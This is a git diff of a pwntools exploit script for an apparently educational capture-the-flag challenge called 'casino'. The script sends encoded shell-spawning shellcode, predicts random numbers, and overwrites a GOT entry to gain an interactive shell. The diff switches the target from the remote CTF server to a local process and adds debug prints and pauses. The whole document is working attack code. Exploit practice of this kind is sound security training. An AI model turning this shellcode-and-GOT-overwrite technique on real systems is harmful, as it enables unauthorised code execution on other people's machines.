@@ -4,6 +4,7 @@ from pwn import *
 # shellcode
 context.clear(arch='x86_64')
 sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
+print('sc ', sc)
 
 # random number
 p = process("./gen_num.out")
@@ -12,9 +13,10 @@ del numbers[-1]
 p.close()
 
 # send
-# r = process("./casino")
+r = process("./casino")
+raw_input()
 # elf = ELF("./casino")
-r = remote('edu-ctf.csie.org', 10172)
+# r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', sc)
 r.sendlineafter('age: ', '40')
 
@@ -37,8 +39,10 @@ for cnt_try in range(0, 2):
     r.recvuntil('[1 ~ 6]: ')
     r.sendline(str(offset + 1))
     print('finished sending offset')
+    raw_input()
     r.sendline(p64(0x6020f0))
     print('finished sending got location')
+    # input()
 
 r.interactive()
 r.close()
